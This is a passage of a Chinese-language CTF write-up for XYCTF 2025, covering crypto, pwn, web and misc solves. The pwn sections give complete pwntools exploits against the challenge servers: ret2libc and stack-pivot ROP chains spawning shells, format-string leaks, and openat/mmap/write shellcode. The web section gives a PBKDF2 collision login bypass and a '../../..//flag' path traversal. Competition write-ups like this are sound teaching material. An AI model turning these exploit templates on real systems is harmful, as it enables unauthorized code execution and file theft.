        c = self.value[0]*x.value[2]-self.value[1]*x.value[3]+self.value[2]*x.value[0]+self.value[3]*x.value[1]
        d = self.value[0]*x.value[3]+self.value[1]*x.value[2]-self.value[2]*x.value[1]+self.value[3]*x.value[0]
        return ComComplex([a,b,c,d])
    def __mod__(self,x):
        return ComComplex([i % x for i in self.value])
    def __pow__(self, x, n=None):
        tmp = ComComplex(self.value)
        a = ComComplex([1,0,0,0])
        while x:
            if x & 1:
                a *= tmp
            tmp *= tmp
            if n:
                a %= n
                tmp %= n
            x >>= 1
        return a
        
    def inv(l,mod):
        inv_len=inverse(sum(i**2 for i in l),mod)
        return ComComplex([l[0]*inv_len%mod,-l[1]*inv_len%mod,-l[2]*inv_len%mod,-l[3]*inv_len%mod])


from Crypto.Util.number import *

hints = [375413371936,452903063925,418564633198,452841062207]
gift = [8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729,20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171,22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868,40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863]
P = 8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109
n = 408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367
c = ComComplex([212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103,24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825,45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125,96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385])
e=65547

inv=ComComplex.inv(hints,P)
gifts=ComComplex(gift)
keys=inv*gifts%P
print(keys)

_,p,q,r=keys.value
print(p*q*r-n)

print(GCD(e,(p-1)*(q-1)*(r-1)))
print(GCD(e,p-1))
print(GCD(e,q-1))
print(GCD(e,r-1))


d=inverse(e,(q**4-q**3-q**2+q)//3)
m=pow(c,d,q)

for i in m.value:
    print(long_to_bytes(i).decode(),end='')



```

flag{Quaternion_15_ComComComComplexXXX!!!?}

## Pwn

### Ret2libc's Revenge

溢出可以写负数来改返回地址，之后ret2libc就行

```python
from pwn import *

context(arch='amd64',os='linux')
context.log_level="DEBUG"
context.terminal = ["tmux", "splitw", "-h"]
#io=process("./chal")
io=remote("47.93.96.189", 36879)

r = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
s = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug(script=""):
	gdb.attach(io, gdbscript=script)

#debug("break *0x40127A")
#debug()

#target=0x404000-0x20
target=0x4005b0+8-0x20
rbp=0x040117d
rsi_0=0x00000000004010e4
add_rsi=0x04010eb
puts=0x404018
rdi_rsi=0x0401180
plt=0x0401070
main=0x40127B
ret=0x00000000004012a9

num=0xffffffff-0x12-0xc8
p="A"*(528)+p64(puts)+p32(num)+p32(num)+p64(rbp)+p64(target)+p64(rsi_0)+p64(add_rsi)
p+=p64(rdi_rsi)+p64(plt)+p64(main)
for i in range(160):
	sl(p)

libc=u64(ru("\x7f",False)[-6:].ljust(8, "\0"))-0x21b780
print hex(libc)


rsi=libc+0x2be51
rsi_rdx=libc+0x118f2f
rdi=libc+0x2a3e5

binsh=libc+0x1d8678
system=libc+0xeb080
print hex(system)

p="A"*(528+8)+p32(num)+p32(num)+p64(rbp)+p64(0x4040a0)+p64(rdi)+p64(binsh)+p64(rsi)+p64(0)+p64(rsi_rdx)+p64(system)
sl(p)
shell()
```



### web苦手

两个密码生成的密钥只要最高位为00就可以绕过检测

```python
import hashlib
import itertools
import string

salt = b"XYCTF"
iterations = 1
dklen = 32

charset = string.ascii_letters + string.digits  # a-zA-Z0-9

for length in range(66, 67):
    for candidate in itertools.product(charset, repeat=length):
        password = ''.join(candidate).encode()
        key = hashlib.pbkdf2_hmac("sha1", password, salt, iterations, dklen)
        if key[0] == 0:
            print("Found password:", password.decode(errors="ignore"))
            exit()

#J
#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae2

```

用这两个密码登陆之后目录穿越拿到真的flag

```python
../../..//flag
```

### girlfriend

栈迁移打mprotect，之后用openat, mmap, write 读flag

```python
from pwn import *

context(arch='amd64',os='linux')
context.log_level="DEBUG"
context.terminal = ["tmux", "splitw", "-h"]
#io=process("./chal")
io=remote("47.94.15.198", 34840)

r = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
s = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug(script=""):
    gdb.attach(io, gdbscript=script)


sa(":","3")
p="%7$p-%15$p-%3$p"
sa("first", p)
ru("name:\n")
leak=ru("Y").split("-")
canary=eval(leak[1])
pie=eval(leak[0])-0x18d9
libc=eval(leak[2])-0x114887
print hex(canary)
print hex(pie)
print hex(libc)

read=libc+0x1147d0
ret=pie+0x0157B
rdi=libc+0x2a3e5
rax=libc+0x45eb0
rsi=libc+0x02be51
r12=libc+0x35731
rdx_r12_r13=libc+0xa80c8
mprotect=libc+0x11eaa0
call=libc+0x29d8e

sa(":","3")

rop="X"*0x30+p64(0)
rop=rop.ljust(0x100, "X")

sc=asm("""
movabs rax, 0x67616C66
push 0
push rax
push rsp
mov rdi, -100
pop rsi
xor rdx, rdx
xor r10, r10
mov rax, 0x101
syscall #openat(AT_FDCWD, "flag.txt", 0, 0);

mov rdi, 0x1337000
mov rsi, 0x1000
mov rdx, 1
mov r10, 1
mov r8, rax
xor r9, r9
mov rax, 0x9
syscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);

mov rdi, 1
mov rsi, 0x1337000
mov rdx, 0x100
mov rax, 1
syscall
""")

rop=""
rop+=p64(rdi)+p64(pie+0x4000)
rop+=p64(rsi)+p64(0x2000)
rop+=p64(rdx_r12_r13)+p64(7)+p64(0)
rop+=p64(rdx_r12_r13)+p64(7)+p64(0)
rop+=p64(mprotect)
#rop+=p64(rdi)+p64(0)
#rop+=p64(rsi)+p64(pie+0x4000+0x1000)
#rop+=p64(r12)+p64(0x100)
#rop+=p64(rdx_r12_r13)+p64(0)*2
#rop+=p64(read)
rop+=p64(rax)+p64(pie+0x40d0)
rop+=p64(call)
rop+=sc

print len(rop)
sa("first", rop)

sla("Choice:", "1")
p="A"*56+p64(canary)+p64(pie+0x04060-8)+p64(pie+0x1676)
#p="A"*56+p64(canary)+"A"*8+p64(pie+0x1220)
#debug()
sa("?", p)


sc=asm("""
movabs rax, 0x67616C66
push 0
push rax
push rsp
mov rdi, -100
pop rsi
xor rdx, rdx
xor r10, r10
mov rax, 0x101
syscall #openat(AT_FDCWD, "flag", 0, 0);

mov rdi, 0x1337000
mov rsi, 0x1000
mov rdx, 1
mov r10, 1
mov r8, rax
xor r9, r9
mov rax, 0x9
syscall #mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);

mov rdi, 1
mov rsi, 0x1337000
mov rdx, 0x100
mov rax, 1
syscall
""")


#debug()
shell()
```



### 明日方舟寻访模拟器

让count变成sh之后传给system，因为输出被关所以把输出道到stderr

```python
from pwn import *

context(arch='amd64',os='linux')
context.log_level="INFO"
context.terminal = ["tmux", "splitw", "-h"]
#io=process("./chal")
io=remote("47.94.172.18", 28754)

r = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
s = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug(script=""):
        gdb.attach(io, gdbscript=script)


p="A"*72+p64(0x4018e5)+p64(0x405bcc)+p64(0x04018FC)

sl("1")

sh=0x6873
while sh>10000:
        sl("3")
        sl("10000")
        sl("3")
        sh-=10000

sl("3")
sl("6739")
sl("3")

sl("4")
sl("1")
#debug()
s(p)

sl("cat flag 1>&2")
shell()
```



### EZ 3.0

mips rop

```python
0x00400a20 : lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop
```

这gadget可以把a0和t9控制，再跳到t9，a0为函数参数。把a0变成/bin/cat flag.txt，t9变成system



```python
from pwn import *

context(arch='mips',os='linux')
context.log_level="INFO"
context.terminal = ["tmux", "splitw", "-h"]
#io=process(["qemu-mipsel","-g","1234","./ez"])
io=remote("47.94.15.198", 26720)
#a=process("./ez")

r = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
s = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug(script=""):
	gdb.attach(a, gdbscript=script,arch="mips")

cat=0x0411010
gadget=0x00400a20

#p="A"*(32+4*1)+p32(0x004009c8)
p="A"*(32+4)+p32(gadget)+p32(cat)+p32(0x400b70)+p32(cat)
#pause()

sa(">", p)

shell()
```

## Misc

### 签个到吧

```bash
>+++++++++++++++++[<++++++>-+-+-+-]<[-]>++++++++++++[<+++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++[<+++>-+-+-+-]<[-]>++++++++++++[<+++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<++++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++[<++++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<.[-]>++++++++++++[<+++++++>-+-+-+-]<[-]>++++++++++[<+++++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<.[-]>++++++++++[<+++++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<[-]>++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++++++[<+++>-+-+-+-]<.[-]>+++++++++++[<++++++++++>-+-+-+-]<.[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++[<++>-+-+-+-]<[-]>++++++++[<++++++>-+-+-+-]<.[-]>+++++++++++[<+++++>-+-+-+-]<[-]>+++++++++++++++++++[<+++++>-+-+-+-]<[-]>+++++++[<+++++++>-+-+-+-]<[-]>+++++++++++++++++++++++++++++[<++++>-+-+-+-]<[-]>+++++++++++[<+++>-+-+-+-]<[-]>+++++++++++++++++++++++++[<+++++>-+-+-+-]<[-]
```

BrainFuck，但是观察到没有 `.` 来输出，在每部分后加上即可

```vbnet
>+++++++++++++++++[<++++++>-+-+-+-]<.[-]>++++++++++++[<+++++++++>-+-+-+-]<.[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<.[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<.[-]>+++++++++++++++++++++++++++++++++++++++++[<+++>-+-+-+-]<.[-]>+++++++++++++++++++++++++++++[<+++>-+-+-+-]<.[-]>+++++++++++++++++[<+++>-+-+-+-]<.[-]>++++++++++++[<+++++++++>-+-+-+-]<.[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<.[-]>++++++++[<++++++>-+-+-+-]<.[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<.[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<.[-]>+++++++++++++++++++[<+++++>-+-+-+-]<.[-]>+++++++++++++++++++++++++++++[<++++>-+-+-+-]<.[-]>++++++++[<++++++>-+-+-+-]<.[-]>+++++++++++++++++++[<+++++>-+-+-+-]<.[-]>+++++++++++[<++++++++>-+-+-+-]<.[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<.[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<.[-]>++++++++++++[<+++++++>-+-+-+-]<.[-]>++++++++++[<+++++++>-+-+-+-]<.[-]>+++++++++++++++++++[<+++++>-+-+-+-]<.[-]>++++++++++[<+++++>-+-+-+-]<.[-]>++++++++[<++++++>-+-+-+-]<.[-]>++++++++++[<+++++>-+-+-+-]<.[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++[<+>-+-+-+-]<.[-]>+++++++++++++++++++[<+++++>-+-+-+-]<.[-]>+++++++++++++++++++++++[<+++>-+-+-+-]<.[-]>+++++++++++[<++++++++++>-+-+-+-]<.[-]>+++++++++++++++++++++++++++++++++++++++++++++++++++++[<++>-+-+-+-]<.[-]>++++++++[<++++++>-+-+-+-]<.[-]>+++++++++++[<+++++>-+-+-+-]<.[-]>+++++++++++++++++++[<+++++>-+-+-+-]<.[-]>+++++++[<+++++++>-+-+-+-]<.[-]>+++++++++++++++++++++++++++++[<++++>-+-+-+-]<.[-]>+++++++++++[<+++>-+-+-+-]<.[-]>+++++++++++++++++++++++++[<+++++>-+-+-+-]<.[-]
```

flag{W3lC0me_t0_XYCTF_2025_Enj07_1t!}

### 曼波曼波曼波

smn.txt的base64逆序，后发现jpg文件头，保存为文件

![](/images/download-1744626745339-68.jpg)														

010查看发现后面跟了PK，binwalk分解得到压缩包

提示说，密码是什么来着，有点记不清了，呜呜呜呜 好像是什么比赛名字加年份

还以为有什么其他的，掩码爆破了一下发现密码确实是XYCTF2025

给了两张一样的图片，双图盲水印秒了

![](/images/EASY_1_decpy3-1744626745339-69.png)



### MADer也要当CTFer

提取mkv文件的字幕轨subs.ass

发现是一堆hex提取出一个RIFX开头的文件，发现是一个aep文件

使用ae打开，发现有图层

![](/images/1743836629066-03a76683-7499-468d-85f3-3fb10439a989-1744626745339-70.png)

取消设置隐藏"消隐"的图层，可以看到有一写文字，flag在flag2这个文本中，需要调一下缩放就可以复制其中的内容了。

![](/images/1743836639502-b7bffbac-436b-46f2-befe-b8721af93a21-1744626745339-72.png)

flag{l_re@IIy_w@nn@_2_Ie@rn_AE}

### 会飞的雷克萨斯

看图猜到是之前小孩炸车事件，直接百度该事件。

![](/images/QQ_1743832187198-1744626745339-71.png)

得到地址：四川省内江市资中县春岚北路

后面XXXXXX内通过地图看应该是中铁城市中心

![](/images/QQ_1743832241003-1744626745339-73.png)

flag{四川省内江市资中县春岚北路中铁城市中心内}

### XGCTF

搜索关键词找到题目名称：**easy_polluted**

![](/images/QQ_1743832317067-1744626745339-74.png)

![](/images/1743832324744-64f7289f-3287-4b94-996f-1b63731e7717-1744626745335-1.png)

github可以搜到dragonkeep

通过访问他的.github.io会重定位到

![](/images/QQ_1743832409731-1744626745339-76.png)

找到第一篇文章。

![](/images/QQ_1743832453654-1744626745339-75.png)

f12找到flag进行base64解密。

![](/images/QQ_1743832482740-1744626745339-77.png)flag{1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e@se_fOrg1ve_Me}

### Greedymen

将题目和思路发给claude写出计算优解代码

思路：先拿最大质数；从其他质数相关的大合数开始取；给对面拿最少分数前提取剩下的数字

算法代码：

```cpp
#include <iostream>
#include <vector>
#include <set>
#include <algorithm>
#include <map>

using namespace std;

vector<int> getFactors(int n)
{
    vector<int> factors;
    for (int i = 1; i <= n; i++)
    {
        if (n % i == 0)
            factors.push_back(i);
    }
    return factors;
}

bool isPrime(int n)
{
    if (n < 2)
        return false;
    for (int i = 2; i * i <= n; i++)
    {
        if (n % i == 0)
            return false;
    }
    return true;
}

struct Evaluation
{
    int immediateGain;
    int futureImpact;
    int numFactors;

    bool operator<(const Evaluation &other) const
    {
        if (immediateGain != other.immediateGain)
            return immediateGain < other.immediateGain;
        if (futureImpact != other.futureImpact)
            return futureImpact < other.futureImpact;
        return numFactors > other.numFactors;
    }
};

const int NEG_INF = -1000000000; // 使用整数常量

Evaluation evaluateChoice(int num, const set<int> &usedNumbers, int maxNum)
{
    vector<int> factors = getFactors(num);
    int opponentGain = 0;
    set<int> newUsed = usedNumbers;
    newUsed.insert(num);

    for (int factor : factors)
    {
        if (factor != num && usedNumbers.find(factor) == usedNumbers.end())
        {
            opponentGain += factor;
        }
    }

    int futureOptions = 0;
    for (int i = maxNum; i >= 2; i--)
    {
        if (newUsed.find(i) == newUsed.end())
        {
            vector<int> iFactors = getFactors(i);
            bool hasUnusedFactor = false;
            for (int f : iFactors)
            {
                if (f != i && newUsed.find(f) == newUsed.end())
                {
                    hasUnusedFactor = true;
                    break;
                }
            }
            if (hasUnusedFactor)
                futureOptions++;
        }
    }

    return {num - opponentGain, futureOptions, (int)factors.size()};
}

void solveLevel(int maxNum, int moves)
{
    set<int> used;
    vector<int> choices;
    int myScore = 0;
    int opponentScore = 0;
    map<int, vector<int>> factorMap;

    // 预计算所有数的因数
    for (int i = 1; i <= maxNum; i++)
    {
        factorMap[i] = getFactors(i);
    }

    while (moves > 0)
    {
        int bestNum = -1;
        Evaluation bestEval = {NEG_INF, NEG_INF, 1000}; // 使用整数常量

        for (int i = maxNum; i >= 2; i--)
        {
            if (used.find(i) != used.end())
                continue;

            bool hasUnusedFactor = false;
            for (int factor : factorMap[i])
            {
                if (factor != i && used.find(factor) == used.end())
                {
                    hasUnusedFactor = true;
                    break;
                }
            }

            if (!hasUnusedFactor)
                continue;

            Evaluation eval = evaluateChoice(i, used, maxNum);
            if (bestEval < eval)
            {
                bestEval = eval;
                bestNum = i;
            }
        }

        if (bestNum == -1)
            break;

        choices.push_back(bestNum);
        myScore += bestNum;
        used.insert(bestNum);

        for (int factor : factorMap[bestNum])
        {
            if (factor != bestNum && used.find(factor) == used.end())
            {
                opponentScore += factor;
                used.insert(factor);
            }
        }

        moves--;
    }

    // 计算剩余数字
    for (int i = 1; i <= maxNum; i++)
    {
        if (used.find(i) == used.end())
        {
            opponentScore += i;
        }
    }

    cout << "Level " << maxNum << " (" << moves << " moves):\n";
    cout << "choices = [";
    for (size_t i = 0; i < choices.size(); i++)
    {
        cout << choices[i];
        if (i < choices.size() - 1)
            cout << ", ";
    }
    cout << "]\n";

    cout << "My Score: " << myScore << "\n";
    cout << "Opponent Score: " << opponentScore << "\n";
    cout << "Score Difference: " << myScore - opponentScore << "\n\n";
}

int main()
{
    solveLevel(50, 19);  // Level 1
    solveLevel(100, 37); // Level 2
    solveLevel(200, 76); // Level 3
    return 0;
}
```

输出：

```cpp
Level 50 (0 moves):
choices = [47, 49, 35, 39, 26, 46, 33, 45, 38, 44, 34, 50, 30, 28, 42, 40, 32, 24, 36]
My Score: 718
Opponent Score: 557
Score Difference: 161

Level 100 (0 moves):
choices = [97, 95, 91, 85, 77, 93, 62, 87, 99, 81, 94, 69, 86, 92, 63, 82, 76, 66, 74, 88, 54, 98, 75, 50, 100, 70, 68, 56, 84, 60, 90, 52, 78, 80, 64, 48, 72]
My Score: 2856
Opponent Score: 2194
Score Difference: 662

Level 200 (0 moves):
choices = [199, 187, 169, 185, 161, 155, 183, 122, 177, 145, 175, 133, 159, 171, 153, 194, 141, 188, 178, 129, 172, 166, 123, 164, 158, 117, 195, 130, 105, 189, 147, 135, 98, 196, 182, 165, 110, 154, 148, 146, 78, 156, 104, 114, 190, 152, 142, 102, 170, 136, 134, 126, 124, 186, 90, 180, 140, 116, 174, 120, 80, 160, 128, 112, 168, 108, 162, 100, 150, 96, 144, 92, 138, 88, 132, 198]
My Score: 11094
Opponent Score: 9006
Score Difference: 2088
```

```python
from pwn import *


context.log_level = 'debug'
sh=remote("47.94.204.178",26629 )

sh.recvuntil(b'3.Quit\n')
sh.sendline(b'1')

# 这边打的时候Level1使用的是之前手动取的值
nums=[[47, 49, 21, 39, 27, 33, 44, 40, 42, 45, 46, 48, 50, 38, 36, 34],
      [97, 95, 91, 85, 77, 93, 62, 87, 99, 81, 94, 69, 86, 92, 63, 82, 76, 66, 74, 88, 54, 98, 75, 50, 100, 70, 68, 56, 84, 60, 90, 52, 78, 80, 64, 96, 72],
      [199, 187, 169, 185, 161, 155, 183, 122, 177, 145, 175, 133, 159, 171, 153, 194, 141, 188, 178, 129, 172, 166, 123, 164, 158, 117, 195, 130, 105, 189, 147, 135, 98, 196, 182, 165, 110, 154, 148, 146, 78, 156, 104, 114, 190, 152, 142, 102, 170, 136, 134, 126, 124, 186, 90, 180, 140, 116, 174, 120, 80, 160, 128, 112, 168, 108, 162, 100, 150, 96, 144, 92, 138, 88, 132, 198]]
for num in nums:
    sh.recvuntil(b'ers\n')
    for i in num:
        sh.recvuntil(b'ber:')
        sh.sendline(str(i).encode())

sh.recvlines()
sh.interactive()
```

b"Congratulations!, Here's Your Flag flag{Greed, is......key of the life.}\n"

